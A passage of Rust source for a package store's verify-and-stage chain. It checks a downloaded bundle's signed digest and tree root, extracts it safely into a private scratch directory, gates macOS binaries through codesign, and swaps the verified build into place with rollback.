// Copyright 2026 Andrew Yates
// SPDX-License-Identifier: Apache-2.0

//! The verify-and-stage chain: a downloaded bundle becomes a verified, ready-to-activate
//! store build, however the bytes were fetched (the manifest is already signature-verified
//! upstream). Given the signed [`Artifact`] and a downloaded archive, [`verify_and_stage`]
//! enforces, in order:
//!
//! 1. Download integrity: the compressed asset's digest equals the signed one
//!    ([`Artifact::digest`]: its `sha256`, or a vendor row's `sha512`; [`check_signed_digest`])
//!    before extraction.
//! 2. Slip-safe staging into a scratch sibling of the build dir, through the lane the row's
//!    `payload` names ([`stage_payload`]), then the row's `links` under `bin/`. Every entry
//!    is vetted before a byte is written and size-capped from the signed `disk_installed`;
//!    the live tree is never extracted over.
//! 3. Apply-time re-verify (TOCTOU): the tree's [`crate::tree::tree_root`], folded by the
//!    extractor as it writes, equals the signed `artifact.tree_root` when one is set.
//! 4. Durability, then an atomic swap with rollback: the tree's contents and directory
//!    entries are flushed first ([`crate::store::sync_tree`]), since a rename is metadata,
//!    then the tree is renamed into `build_dir` and the build marked complete, durably.
//! 5. Caller hooks ([`StageHooks`]): a gate over the verified tree before anything publishes
//!    it ([`developer_id_gate`]), and sidecars written durably after the swap and before the
//!    marker.
//!
//! Any failure removes the scratch and fails closed, and a stage that cannot install the new
//! build never uninstalls the old one.

use std::collections::BTreeMap;
use std::path::{Component, Path, PathBuf};

use crate::extract::{
    ExtractError, ExtractOptions, FrameChecksum, TreeAccumulator, extract_tar_gz_tree,
    extract_tar_zst_tree, extract_zip_tree,
};
use crate::manifest::{Artifact, DigestAlg};
use crate::tree::{DeclaredModes, tree_root, tree_root_declared};

/// A development seam (`aterm_types::dev_seam!`; a shipped binary does not read it): set
/// non-empty, [`verify_and_stage`] also walks the staged tree with [`crate::tree::tree_root`]
/// and refuses unless the walk agrees with the root the extractor folded. For a developer
/// chasing a suspected filesystem fault; off by default, since it costs a second full pass
/// over the payload. `aterm pkg verify` re-attests installed bytes in every build.
const DISK_REVERIFY_ENV: &str = "ATPKG_STAGE_DISK_REVERIFY";

/// Why staging a downloaded bundle failed. Each aborts the stage fail-closed.
#[derive(Debug)]
pub enum StageError {
    /// I/O while hashing / preparing the staging dir.
    Io(std::io::Error),
    /// The compressed asset's digest did not match the signed one ([`Artifact::digest`]),
    /// named by its algorithm. `expected` is empty for a row that signs no digest.
    DigestMismatch {
        alg: DigestAlg,
        expected: String,
        got: String,
    },
    /// Extraction failed (tar-slip escape, size cap, or tar/zstd error).
    Extract(ExtractError),
    /// The extracted tree's `tree_root` did not match the signed `artifact.tree_root`.
    TreeRootMismatch { expected: String, got: String },
    /// An `https` payload could not be laid down as the row describes: an unknown
    /// `payload` lane, an inadmissible `entry`/`links` name or target, a `links` target
    /// missing from the staged tree, or the `dmg` tooling (`hdiutil`/`ditto`)
    /// refusing the image. Names the field or tool, so a mis-authored row fails fast on
    /// the authoring machine.
    Payload(String),
    /// A mounted DMG root contains this many real app directories, rather than one.
    DmgAppCount(usize),
    /// The staged tree's platform signer check refused it: a Mach-O not signed by the
    /// pinned Developer ID team, no Mach-O at all, an exposed tool's entry that is not a
    /// verified Mach-O, or a shape that would let code escape the check (an interpreter
    /// script, a symlinked Mach-O) ([`developer_id_gate`]). Deterministic for these bytes,
    /// which already matched their digest, so it is memoized like a digest refusal.
    SignerRefused(String),
    /// The platform signer check did not finish: codesign was still reading a Mach-O at its
    /// deadline ([`developer_id_gate`]). No verdict on the bytes: nothing is memoized, the
    /// verified archive is kept for the next pass to re-stage without a download, and the
    /// vendor lane reports a wait, not a failure.
    VerifyDeferred(String),
}

impl std::fmt::Display for StageError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StageError::Io(e) => write!(f, "io: {e}"),
            StageError::DigestMismatch { alg, expected, got } => {
                write!(f, "asset {alg} mismatch: expected {expected}, got {got}")
            }
            StageError::Extract(e) => write!(f, "extract: {e}"),
            StageError::TreeRootMismatch { expected, got } => {
                write!(f, "tree_root mismatch: expected {expected}, got {got}")
            }
            StageError::Payload(m) => write!(f, "payload: {m}"),
            StageError::DmgAppCount(count) => {
                write!(
                    f,
                    "payload: dmg image root must hold exactly one .app, found {count}"
                )
            }
            StageError::SignerRefused(m) => write!(f, "signer refused: {m}"),
            StageError::VerifyDeferred(m) => write!(f, "signature check deferred: {m}"),
        }
    }
}

impl std::error::Error for StageError {}

/// A stage's pre-swap hook: examines the verified `.incoming` tree.
pub(crate) type PreSwapHook<'a> = &'a dyn Fn(&Path) -> Result<(), StageError>;

/// A stage's sidecar hook: given the folded `tree_root`, the `(suffix, bytes)` sidecars to
/// write beside the build — or the refusal that stops the stage before the swap.
pub(crate) type SidecarHook<'a> =
    &'a dyn Fn(&str) -> Result<Vec<(&'static str, Vec<u8>)>, StageError>;

/// Caller steps inside [`verify_and_stage`]. [`StageHooks::NONE`] runs none and stages
/// exactly as a stage without hooks.
#[derive(Clone, Copy, Default)]
pub struct StageHooks<'a> {
    /// Run on the `.incoming` tree after the digest and `tree_root` checks and before
    /// anything flushes or publishes it; an `Err` refuses the stage with nothing swapped,
    /// marked or recorded.
    pub pre_swap: Option<PreSwapHook<'a>>,
    /// Asked once the tree is verified; each `(suffix, bytes)` is written durably as
    /// `<build><suffix>` after the swap and before `.ready`, so `.ready` implies every
    /// sidecar exists. A suffix outside [`crate::store::STAGE_SIDECAR_SUFFIXES`] refuses
    /// the stage before the swap.
    pub sidecars: Option<SidecarHook<'a>>,
    /// `(name, target)` tool names laid in the verified `.incoming` tree before
    /// [`Self::pre_swap`] sees it: `bin/<name>` a REGULAR-FILE clone of the payload's own
    /// `bin/<target>` (executable spellings, [`crate::store::ToolName::exe_file`]), declared
    /// at the target's mode ([`lay_aliases`]). The gate then judges each clone as a file of
    /// its own, and the root the stage folds after the hook — the one the sidecars get and
    /// the stage returns — names it, as every later walk of the build does
    /// ([`crate::vendor_direct::VendorSpec::aliases`]). Empty: the tree is laid as the
    /// payload made it, and its root is the one folded while extracting.
    pub aliases: &'a [(&'a str, &'a str)],
}

impl StageHooks<'_> {
    /// No hooks.
    pub const NONE: StageHooks<'static> = StageHooks {
        pre_swap: None,
        sidecars: None,
        aliases: &[],
    };
}

/// A [`StageError::Io`] that names the step it came from: `io: <step>: <error>`.
///
/// `std::io::Error` carries no path and no verb, and on Windows one `Access is denied`
/// covers a tree flush, a rename and a sweep, each with a different fix. The kind is kept,
/// so every `matches!` on it still holds.
fn io_step(step: &str, e: std::io::Error) -> StageError {
    let mut m = String::from(step);
    m.push_str(": ");
    m.push_str(&e.to_string());
    StageError::Io(std::io::Error::new(e.kind(), m))
}

/// The download-integrity gate: whether `file` holds the bytes `artifact`'s signed digest
/// ([`Artifact::digest`]) names. The stage's step 1, and every earlier place that asks the
/// same (a carried archive, a group member's fresh download). A row that signs no digest
/// matches no file.
///
/// # Errors
/// [`StageError::DigestMismatch`] naming the algorithm, or [`StageError::Io`] when `file`
/// does not read.
pub(crate) fn check_signed_digest(artifact: &Artifact, file: &Path) -> Result<(), StageError> {
    let (alg, expected) = artifact.digest().unwrap_or((DigestAlg::Sha256, ""));
    let got = crate::tree::file_digest(file, alg).map_err(|e| io_step("read the archive", e))?;
    if expected.is_empty() || !got.eq_ignore_ascii_case(expected) {
        return Err(StageError::DigestMismatch {
            alg,
            expected: expected.to_string(),
            got,
        });
    }
    Ok(())
}

/// Uncompressed-size cap for extraction: twice the signed `disk_installed`, at least 1 MiB,
/// so a decompression bomb is bounded by the signed size, never a tar header. A
/// `disk_installed` of 0 falls back to 2 GiB.
///
/// The extractor holds a tar to it twice, once for file content and once for the structure
/// around it (`extract::TooLargeReason::StructureCap`). The packers sign `disk_installed`
/// as the larger of the apparent file sizes and half the decompressed stream
/// (`atpkg_publish::artifact::tarwrite`), so their bundles fit either allowance; the factor
/// of two is headroom for a row whose `disk_installed` counted content alone.
fn size_cap(artifact: &Artifact) -> u64 {
    let signed = artifact.cost.disk_installed;
    if signed == 0 {
        UNSIGNED_SIZE_CAP
    } else {
        signed.saturating_mul(2).max(1 << 20)
    }
}

/// The maximum entry count — a tar-bomb (millions of tiny entries) guard well above any
/// real toolchain bundle.
pub(crate) const MAX_ENTRIES: u64 = 4_000_000;

/// Extraction ceiling when no signed installed-size estimate is available.
pub(crate) const UNSIGNED_SIZE_CAP: u64 = 2u64 << 30;

/// The mode of the `<build>.incoming-<pid>` scratch while a stage fills and verifies it:
/// its owner's alone, so nobody else can reach a member before it has its final mode or
/// rename one between the verify and the swap. Opened to the build's `0755` just before
/// the swap ([`verify_and_stage`], step 3b).
const STAGING_SCRATCH_MODE: u32 = 0o700;

/// Verify a downloaded `archive` against the signed `artifact` and stage it at `build_dir`
/// (module docs). On success `build_dir` holds the verified tree; on any failure the partial
/// tree is removed, and whatever was installed at `build_dir` before is still installed and
/// still marked complete.
///
/// The tree is built in a scratch sibling and becomes `build_dir` only once it passes every
/// check, with the marker cleared for the swap: deleting first would destroy a working build
/// before its replacement verified and leave `<build>.ready` vouching for a half-written
/// tree. A crash leaves one of two honest states: the old build, complete; or no build,
/// unmarked and re-installable.
///
/// Returns the `tree_root` folded while staging (the verified one when the row signs one).
pub fn verify_and_stage(
    artifact: &Artifact,
    archive: &Path,
    build_dir: &Path,
    hooks: &StageHooks<'_>,
) -> Result<String, StageError> {
    // 1. Download integrity, before any work extracting.
    check_signed_digest(artifact, archive)?;

    // 2. Extract into a scratch sibling (tar-slip-safe, size-capped from the signed size);
    //    the live tree is untouched. Scratch a killed earlier run left is swept first: the
    //    store lock makes it ours.
    crate::store::sweep_stage_scratch(build_dir);
    let incoming = crate::store::incoming_dir(build_dir).ok_or_else(|| {
        StageError::Io(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "build dir has no name",
        ))
    })?;
    //    The scratch is private while it fills, whatever the umask: born `0700`, exclusively
    //    ([`crate::platform::make_dir_born`]), under a `store/<program>/` made at the store's
    //    directory mode. A umask-derived mode would let a group, or every user of a system
    //    prefix, swap `bin/` or `Foo.app` before the walk sanitizes it. Opened to the build
    //    mode in step 3b.
    crate::store::make_build_parent(build_dir)
        .and_then(|()| crate::platform::make_dir_born(&incoming, STAGING_SCRATCH_MODE))
        .map_err(|e| io_step("create the staging scratch", e))?;
    //    The stage hands back the `tree_root` folded from the bytes as they were written,
    //    the one pass over the uncompressed payload (the `dmg` lane walks once, since
    //    `ditto` wrote its bytes), and the modes it declared per regular file, which step 4c
    //    records for a filesystem with no POSIX bits.
    let (extracted_root, mut modes) = match stage_payload_modes(artifact, archive, &incoming) {
        Ok(staged) => staged,
        Err(e) => {
            let _ = crate::store::remove_tree(&incoming);
            return Err(e);
        }
    };

    // 3. Apply-time re-verify (TOCTOU): the tree must match the signed tree_root when the row
    //    signs one; a mismatch (tamper, partial extract) aborts with the installed build
    //    untouched. The root is the one the extractor folded from the bytes it wrote, so it
    //    refuses a substituted or corrupt archive, a truncated extraction and any layout, mode
    //    or content that differs from what was signed. It gives up one window, a mutation
    //    after the write inside the `0700` scratch while this process holds the store lock:
    //    closing it costs re-reading the whole payload (3.44 GB for `trust`), which the
    //    `ATPKG_STAGE_DISK_REVERIFY` dev seam does.
    //
    //    The byte format is a cross-version contract (signed manifests embed roots from
    //    earlier releases): both producers share `tree::entry_line` and
    //    `tree::root_of_entry_lines`, pinned together by `extract.rs`'s
    //    `fused_tree_root_is_byte_identical_to_the_on_disk_walk`.
    let root = if artifact.tree_root.is_empty() {
        extracted_root
    } else {
        let got = match reverified_root(&incoming, extracted_root, disk_reverify_armed(), &modes) {
            Ok(r) => r,
            Err(e) => {
                let _ = crate::store::remove_tree(&incoming);
                return Err(io_step("re-walk the staged tree", e));
            }
        };
        if !got.eq_ignore_ascii_case(&artifact.tree_root) {
            let _ = crate::store::remove_tree(&incoming);
            return Err(StageError::TreeRootMismatch {
                expected: artifact.tree_root.clone(),
                got,
            });
        }
        got
    };

    // 3a. The caller's aliases, its gate and its records, on the verified tree before
    //     anything publishes it: a refusal leaves no build, no marker and no sidecar. The
    //     aliases come first, so the gate judges each clone as a file of its own; the root
    //     is then folded again over the tree as the gate left it, so the record and every
    //     later walk name them. The sidecars are rendered now so a bad suffix refuses before
    //     the swap too; they are written after it.
    if let Err(e) = lay_aliases(&incoming, hooks.aliases, &mut modes) {
        let _ = crate::store::remove_tree(&incoming);
        return Err(e);
    }
    if let Some(pre_swap) = hooks.pre_swap
        && let Err(e) = pre_swap(&incoming)
    {
        let _ = crate::store::remove_tree(&incoming);
        return Err(e);
    }
    let root = if hooks.aliases.is_empty() {
        root
    } else {
        match tree_root_declared(&incoming, &modes) {
            Ok(root) => root,
            Err(e) => {
                let _ = crate::store::remove_tree(&incoming);
                return Err(io_step("fold the tree its aliases joined", e));
            }
        }
    };
    let sidecars = match hooks.sidecars.map(|render| render(&root)).transpose() {
        Ok(sidecars) => sidecars.unwrap_or_default(),
        Err(e) => {
            let _ = crate::store::remove_tree(&incoming);
            return Err(e);
        }
    };
    if let Some((suffix, _)) = sidecars
        .iter()
        .find(|(suffix, _)| !crate::store::STAGE_SIDECAR_SUFFIXES.contains(suffix))
    {
        let _ = crate::store::remove_tree(&incoming);
        return Err(payload2(
            "sidecar suffix the store does not reclaim: ",
            suffix,
        ));
    }

    // 3b. Durability, before anything publishes this tree. The swap is renames, and a
    //     rename is metadata: on a delayed-allocation filesystem (ext4's default) the
    //     entries for `<build>/` and `<build>.ready` can reach the journal while the data is
    //     still page cache, and a power loss would leave "build N is complete" over
    //     truncated files, which nothing repairs (`decide` answers `UpToDate`). So the
    //     contents go down first, and the names that vouch for them after.
    //
    //     First the root opens from the scratch's `0700` to the build mode
    //     ([`crate::extract::safe_mode`], `0755`), every member having its final mode by
    //     now; a single-binary build's `bin/` is then sealed against its vendor's in-place
    //     updater ([`crate::store::seal_bin`]). Nothing writes into the tree after this.
    if let Err(e) = crate::platform::set_mode(&incoming, crate::extract::safe_mode(0, true)) {
        let _ = crate::store::remove_tree(&incoming);
        return Err(io_step("give the staged tree the build's mode", e));
    }
    if crate::vendor::is_binary_payload(&artifact.payload)
        && let Err(e) = crate::store::seal_bin(&incoming)
    {
        let _ = crate::store::remove_tree(&incoming);
        return Err(io_step("seal the build's bin", e));
    }
    if let Err(e) = crate::store::sync_tree(&incoming) {
        let _ = crate::store::remove_tree(&incoming);
        return Err(io_step("flush the staged tree", e));
    }

    // 4. Swap: marker down first (mid-swap the build is honestly not complete), the old tree
    //    aside, the verified tree into place, the old tree reclaimed.
    if let Err(e) = swap_into_place(build_dir, &incoming) {
        let _ = crate::store::remove_tree(&incoming);
        return Err(io_step("swap the staged tree into place", e));
    }

    // 4b. The caller's sidecars, durably, then the directory that names them: `.ready`
    //     below implies each one exists. A failed write leaves the tree unmarked.
    if !sidecars.is_empty() {
        for (suffix, bytes) in &sidecars {
            crate::store::write_sidecar_durably(build_dir, suffix, bytes)
                .map_err(|e| io_step("record a sidecar beside the build", e))?;
        }
        if let Some(parent) = build_dir.parent() {
            // Ordered: `.ready` implies the sidecars, so they land before it; lost with
            // the marker, the build is staged again.
            crate::store::sync_dir_ordered(parent);
        }
    }

    // 4c. The declared-mode record (`<build>.modes`, a sibling outside the hashed tree): on
    //     a filesystem that stores no permission bits, the only way a later on-disk walk
    //     (`atpkg verify`) can fold the mode slot the signed root used; a no-op on Unix.
    //     Before the marker, so a build without it stays unmarked and re-stageable.
    if let Err(e) = crate::store::write_declared_modes(build_dir, &modes) {
        return Err(io_step("record the declared modes beside the build", e));
    }

    // 5. Mark the build complete, last: after the tree_root re-verify (the marker is never
    //    part of the hashed tree) and after the swap. `list_installed` skips marker-less
    //    build dirs, so a partial a crash left is re-installed, not treated as up to date.
    if let Err(e) = crate::store::mark_build_ready(build_dir) {
        // Leave the tree: the outgoing one is already reclaimed, so deleting this one would
        // leave neither build, with `current` perhaps naming this one. It passed every check,
        // so it is the verified toolchain, honestly unmarked: it reads as not installed
        // (`list_installed`, `flow::installed_for_decide`) and the next run re-stages it,
        // while a `current` link naming it still resolves. Nothing extracts into
        // `build_dir` (it is swapped onto); the next stage or `gc`'s partial arm reclaims it.
        return Err(io_step("mark the build complete", e));
    }
    if let Some(parent) = build_dir.parent() {
        // Ordered: the marker's name lands before anything after it; a lost or torn
        // marker reads as incomplete and the next pass stages the build again.
        crate::store::sync_dir_ordered(parent);
    }
    Ok(root)
}

/// Lay `aliases` ([`StageHooks::aliases`]) in the staged tree `incoming`: each `bin/<name>`
/// a regular file holding exactly the bytes of the payload's own `bin/<target>`, declared at
/// its mode. A clone where the filesystem can (APFS, a reflink on Linux:
/// [`crate::clone::clone_file`]), a byte copy where it cannot (Windows). Never a symlink: a
/// link to a Mach-O is a shape the Developer ID gate refuses
/// ([`crate::macho::find_macho`]: only a regular file is verified), and a link's argv0 would
/// still resolve to the target's name.
///
/// # Errors
/// [`StageError::Payload`] when a name is no tool name, the target is not a regular file of
/// the payload (missing, a directory, a link), or the payload ships the alias's name itself;
/// [`StageError::Io`] when the clone fails.
fn lay_aliases(
    incoming: &Path,
    aliases: &[(&str, &str)],
    modes: &mut DeclaredModes,
) -> Result<(), StageError> {
    for &(name, target) in aliases {
        let (Some(alias), Some(of)) = (
            crate::store::ToolName::new(name),
            crate::store::ToolName::new(target),
        ) else {
            return Err(payload2(
                "alias: not a tool name pair: ",
                &format!("{name} = {target}"),
            ));
        };
        let from = Path::new("bin").join(of.exe_file());
        let to = Path::new("bin").join(alias.exe_file());
        let shown = |rel: &Path| rel.to_string_lossy().replace('\\', "/");
        if !std::fs::symlink_metadata(incoming.join(&from)).is_ok_and(|m| m.file_type().is_file()) {
            return Err(StageError::Payload(format!(
                "alias {}: {} is not a regular file in the vendor's tree",
                shown(&to),
                shown(&from)
            )));
        }
        if std::fs::symlink_metadata(incoming.join(&to)).is_ok() {
            return Err(StageError::Payload(format!(
                "alias {}: the vendor's tree already has one",
                shown(&to)
            )));
        }
        #[cfg(unix)]
        let laid = crate::clone::clone_file(&incoming.join(&from), &incoming.join(&to));
        #[cfg(not(unix))]
        let laid = std::fs::copy(incoming.join(&from), incoming.join(&to)).map(drop);
        laid.map_err(|e| io_step("lay an alias", e))?;
        if let Some(mode) = modes.get(&crate::tree::rel_line_bytes(&from)).copied() {
            modes.insert(crate::tree::rel_line_bytes(&to), mode);
        }
    }
    Ok(())
}

/// How long [`developer_id_gate`] may spend on one tree, across every Mach-O: each codesign
/// call is bounded on its own, and this bounds their number. It grows by each file's
/// size-scaled allowance above the 30 s floor
/// ([`aterm_update_core::codesign::verify_timeout_for`]).
const DEVELOPER_ID_BUDGET: std::time::Duration = std::time::Duration::from_secs(120);

/// A [`StageHooks::pre_swap`] gate for a darwin agent build: every Mach-O in the staged tree
/// ([`crate::macho::find_macho`]: by magic, regular files only) must verify as signed by
/// Developer ID `team` (`check`; production [`codesign_team_check`]), there must be at least
/// one, each exposed tool's `bin/<tool>` (what its shim runs) must be one of them, and no
/// other file may carry an execute bit. Off macOS there is no platform anchor and it passes.
///
/// codesign's verdict ([`CodesignError::is_verdict`]) is [`StageError::SignerRefused`]; an
/// inadmissible team or tool name is [`StageError::Payload`]; codesign failing to judge (an
/// unreadable file, an internal error) is [`StageError::Io`], a fact about this machine,
/// retried rather than memoized; and codesign not finishing by its size-scaled deadline
/// ([`aterm_update_core::codesign::verify_timeout_for`]) is [`StageError::VerifyDeferred`].
///
/// [`CodesignError::is_verdict`]: aterm_update_core::codesign::CodesignError::is_verdict
pub(crate) fn developer_id_gate(
    team: &str,
    exposes: &[&str],
    check: TeamCheck,
) -> impl Fn(&Path) -> Result<(), StageError> + use<> {
    let team = team.to_string();
    let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
    move |tree: &Path| {
        if !cfg!(target_os = "macos") {
            return Ok(());
        }
        let verify = |path: &Path, deadline: std::time::Instant| check(path, &team, deadline);
        check_developer_id(tree, &team, &exposes, &verify)
    }
}

/// How [`developer_id_gate`] judges one Mach-O against a team by a deadline.
pub(crate) type TeamCheck =
    fn(&Path, &str, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;

/// The real [`TeamCheck`]: `/usr/bin/codesign` under the pinned Developer ID requirement.
///
/// # Errors
/// codesign's verdict, or its failure to give one.
pub(crate) fn codesign_team_check(
    path: &Path,
    team: &str,
    deadline: std::time::Instant,
) -> Result<(), aterm_update_core::codesign::CodesignError> {
    aterm_update_core::codesign::verify_developer_id_until(path, team, false, deadline)
}

/// One Mach-O's Developer ID check, finished by the deadline.
type VerifyOne<'a> =
    &'a dyn Fn(&Path, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;

/// [`developer_id_gate`]'s rules over `tree`, with each Mach-O checked by `verify`.
fn check_developer_id(
    tree: &Path,
    team: &str,
    exposes: &[String],
    verify: VerifyOne<'_>,
) -> Result<(), StageError> {
    if exposes.is_empty() {
        return Err(payload2(
            "developer id gate: no exposed tool to bind for team ",
            team,
        ));
    }
    let mut signer = String::from("Developer ID team ");
    signer.push_str(team);
    check_signed_tree(tree, &signer, exposes, verify)
}

/// A [`StageHooks::pre_swap`] gate for an ALAB PACK of an ALab-built agent program
/// ([`crate::alab`]): the staged tree is an ALab package ([`crate::alab::is_alab_package`])
/// whose entrypoint is what one of `exposes`' shims runs (`bin/<tool>`), and on macOS every
/// Mach-O in it passes `codesign --verify --strict` (`check`, production:
/// [`codesign_strict_check`]; codex-alab is signed ad hoc by `alab/package.sh`) under the
/// same rules as [`developer_id_gate`] — at least one Mach-O, each exposed tool's entry one
/// of them, no other file executable. NEVER the Developer ID gate: these bytes are vouched
/// for by the roster-signed manifest and its sha256 and `tree_root`, not by a vendor's team,
/// and the vendor lane keeps that gate unchanged.
pub(crate) fn alab_pack_gate(
    exposes: &[String],
    check: StrictCheck,
) -> impl Fn(&Path) -> Result<(), StageError> + use<> {
    let exposes = exposes.to_vec();
    move |tree: &Path| {
        if !crate::alab::is_alab_package(tree) {
            return Err(StageError::Payload(String::from(
                "alab pack gate: the staged tree is not an ALab package (codex-package.json \
                 layout 1 with its entrypoint, and alab-build.json)",
            )));
        }
        let entry = crate::alab::entrypoint_of(tree);
        let shimmed = exposes.iter().any(|name| {
            crate::store::ToolName::new(name).is_some_and(|tool| {
                entry.as_deref() == Some(Path::new("bin").join(tool.exe_file()).as_path())
            })
        });
        if !shimmed {
            return Err(StageError::Payload(String::from(
                "alab pack gate: the package's entrypoint is not what an exposed tool's shim runs",
            )));
        }
        if !cfg!(target_os = "macos") {
            return Ok(());
        }
        check_signed_tree(tree, ALAB_SIGNER, &exposes, &|path, deadline| {
            check(path, deadline)
        })
    }
}

/// [`alab_pack_gate`] with the real [`codesign_strict_check`], for a tree on disk: what the
/// producer (`atpkg-publish pack-package`, and `atpkg-publish index` before it pins an ALab
/// build) holds a package to, so it never signs or pins a pack this client's stage refuses.
///
/// # Errors
/// The gate's refusal, as a stage would report it.
pub fn check_alab_pack(tree: &Path, exposes: &[String]) -> Result<(), StageError> {
    alab_pack_gate(exposes, codesign_strict_check)(tree)
}

/// How [`alab_pack_gate`] names what each Mach-O must carry.
const ALAB_SIGNER: &str = "a valid signature (codesign --verify --strict)";

/// How [`alab_pack_gate`] judges one Mach-O by a deadline.
pub(crate) type StrictCheck =
    fn(&Path, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;

/// The real [`StrictCheck`]: `/usr/bin/codesign --verify --strict --verbose=2 <path>`, with
/// no designated requirement (an ad hoc signature passes; an unsigned or modified one does
/// not), bounded by `deadline` and judged as the Developer ID check judges its run.
///
/// # Errors
/// codesign's verdict, or its failure to give one.
pub(crate) fn codesign_strict_check(
    path: &Path,
    deadline: std::time::Instant,
) -> Result<(), aterm_update_core::codesign::CodesignError> {
    use aterm_update_core::codesign::{CODESIGN, CodesignError, developer_id_verdict};
    if !cfg!(target_os = "macos") {
        return Err(CodesignError::Unsupported);
    }
    let mut cmd = aterm_uds::spawnfd::command(CODESIGN);
    cmd.args(["--verify", "--strict", "--verbose=2"]).arg(path);
    developer_id_verdict(aterm_uds::deadline::output_until(&mut cmd, deadline))
}

/// The Mach-O rules every signed darwin tree is held to, with each Mach-O checked by
/// `verify` and `signer` naming what it must carry: at least one Mach-O, each exposed tool's
/// `bin/<tool>` one of them, no other file executable, and every one passing `verify`.
fn check_signed_tree(
    tree: &Path,
    signer: &str,
    exposes: &[String],
    verify: VerifyOne<'_>,
) -> Result<(), StageError> {
    use aterm_update_core::codesign::{CodesignError, VERIFY_TIMEOUT, verify_timeout_for};
    let found = crate::macho::find_macho(tree)?;
    if found.is_empty() {
        let mut m = String::from("no Mach-O in the staged tree; a darwin build must carry ");
        m.push_str("at least one, signed by ");
        m.push_str(signer);
        return Err(StageError::SignerRefused(m));
    }
    // What each shim runs must be a verified Mach-O, or a decoy beside it satisfies the
    // floor while the entry runs unchecked.
    for name in exposes {
        let Some(tool) = crate::store::ToolName::new(name) else {
            return Err(payload2("developer id gate: not a tool name: ", name));
        };
        let entry = tree.join("bin").join(tool.exe_file());
        if !found.contains(&entry) {
            let mut m = String::from("bin/");
            m.push_str(&tool.exe_file());
            m.push_str(" is not a Mach-O in the staged tree; its shim would run it unverified");
            return Err(StageError::SignerRefused(m));
        }
    }
    // Any execute bit sits on a verified Mach-O: a text file carrying one runs through
    // `/bin/sh`, signature unchecked.
    if let Some(stray) = crate::macho::executable_files(tree)?
        .into_iter()
        .find(|p| !found.contains(p))
    {
        let mut m = stray
            .strip_prefix(tree)
            .unwrap_or(&stray)
            .to_string_lossy()
            .into_owned();
        m.push_str(" is executable but not a Mach-O; it would run unverified");
        return Err(StageError::SignerRefused(m));
    }
    // Each file's deadline scales with its size: codesign's time is its read time, and the
    // window's passes run it IO-throttled (`VERIFY_MIN_BYTES_PER_SEC`).
    let allowance = |path: &Path| {
        let len = std::fs::symlink_metadata(path).map_or(0, |m| m.len());
        verify_timeout_for(len)
    };
    let extra = found
        .iter()
        .map(|p| allowance(p).saturating_sub(VERIFY_TIMEOUT))
        .fold(
            std::time::Duration::ZERO,
            std::time::Duration::saturating_add,
        );
    let budget = std::time::Instant::now() + DEVELOPER_ID_BUDGET.saturating_add(extra);
    for path in &found {
        let deadline = budget.min(std::time::Instant::now() + allowance(path));
        let rel = path.strip_prefix(tree).unwrap_or(path).to_string_lossy();
        let mut m = String::from(rel.as_ref());
        match verify(path, deadline) {
            Ok(()) => {}
            Err(e) if e.is_verdict() => {
                m.push_str(" is not signed by ");
                m.push_str(signer);
                m.push_str(": ");
                m.push_str(&e.to_string());
                return Err(StageError::SignerRefused(m));
            }
            Err(e @ CodesignError::InvalidTeam(_)) => {
                return Err(payload2("developer id gate: ", &e.to_string()));
            }
            // Not finishing is not a verdict and not a fault: the next pass asks again.
            Err(e @ CodesignError::TimedOut) => {
                m.push_str(": ");
                m.push_str(&e.to_string());
                return Err(StageError::VerifyDeferred(m));
            }
            Err(e) => {
                m.push_str(": ");
                m.push_str(&e.to_string());
                return Err(StageError::Io(std::io::Error::other(m)));
            }
        }
    }
    Ok(())
}

/// Lay the verified download at `archive` down under `dest` in the shape `artifact.payload`
/// names, and return the `tree_root` of what was laid down.
///
/// The one producer of a staged tree, shared by the client stage ([`verify_and_stage`],
/// step 2) and the authoring ceremony: the tool that writes a signed row's `tree_root` must
/// stage through this function, or the two roots disagree (mode sanitizing,
/// `strip_components`, the `links` shape and which `.app` is copied are not reproducible by
/// a second implementation). Lanes, by `payload`:
///
/// * `""`: a release bundle (`binary` / `sysroot-bundle`): `.tar.zst`, symlinks refused,
///   nothing stripped;
/// * `tar-zst` / `tar-gz` / `zip`: a vendor archive, `strip_components` applied and in-root
///   symlinks admitted ([`crate::extract::ExtractOptions`]);
/// * `raw-binary`: the download is the binary, laid as `bin/<entry>` at `0755`;
/// * `tar-gz-binary`: a gzip tar of exactly one regular file at its root, laid as a
///   `raw-binary` of its bytes would be;
/// * `dmg` (macOS only): the single `.app` at the image root, copied with `ditto` and no
///   ACL, then given the modes of every other lane ([`vet_copied_tree`]). Its links,
///   contents and extended attributes are the vendor's; its permissions are the stage's
///   (docs/AUDIT-atpkg-inputs-2026-10-04.md).
///
/// Every lane's directories are `0755` and its regular files `0755` (any `x` bit) or `0644`
/// ([`crate::extract::safe_mode`]): never setuid, setgid or sticky, never group- or
/// other-writable.
///
/// Then the row's `links` become relative symlinks `bin/<name> -> ../<target>`
/// ([`apply_links`]). The root is folded from what was written for the archive and raw
/// lanes, and handed out only once a listing spells back every name it records
/// (`TreeAccumulator::require_spelled_back`); the `dmg` lane walks the finished tree once.
///
/// `dest` must be an empty (or absent) directory the caller owns. On error the caller
/// removes `dest`.
///
/// # Errors
/// [`StageError::Extract`] for anything the extractor refused (a slip, a cap, a
/// malformed container), [`StageError::DmgAppCount`] for a DMG with the wrong app count,
/// [`StageError::Payload`] for another row the lane cannot honour, and
/// [`StageError::Io`] for the filesystem.
pub fn stage_payload(
    artifact: &Artifact,
    archive: &Path,
    dest: &Path,
) -> Result<String, StageError> {
    stage_payload_modes(artifact, archive, dest).map(|(root, _)| root)
}

/// [`stage_payload`], also handing back the permission bits it declared per regular file
/// ([`TreeAccumulator::declared_modes`]): the mode slot a walk on a filesystem with no POSIX
/// bits (Windows) must fold to reproduce the root ([`crate::tree::tree_root_declared`]).
/// Empty for the `dmg` lane, which is macOS only, where the inode answers.
///
/// # Errors
/// As [`stage_payload`].
pub(crate) fn stage_payload_modes(
    artifact: &Artifact,
    archive: &Path,
    dest: &Path,
) -> Result<(String, DeclaredModes), StageError> {
    let cap = size_cap(artifact);
    let vendor = ExtractOptions {
        strip_components: artifact.strip_components,
        symlinks: crate::extract::SymlinkPolicy::InRoot,
        allow_global_pax: false,
    };
